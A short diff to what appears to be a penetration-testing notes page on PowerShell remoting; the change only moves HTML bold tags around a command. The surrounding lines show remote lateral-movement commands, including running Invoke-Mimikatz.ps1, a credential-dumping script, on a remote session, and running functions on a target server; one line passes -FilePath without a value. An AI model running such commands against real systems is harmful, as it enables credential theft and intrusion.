@@ -45,8 +45,8 @@ Enter-PSSession -Session $sess
 
 <pre class="language-powershell"><code class="lang-powershell"># test remoting connection
 Invoke-Command -Session $Session -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'
-Invoke-Command -Computername Srv01.Security.local -ScriptBlock {Whoami;Hostname}
-<strong>
+<strong>Invoke-Command -Computername Srv01.Security.local -ScriptBlock {Whoami;Hostname}
+</strong><strong>
 </strong># Run locally loaded functions on target system
 Invoke-Command -Computername Srv01.Security.local -ScriptBlock ${Function:Test-Function}
 Invoke-Command -Session $Session -FilePath -ScriptBlock ${Function:Test-Function}
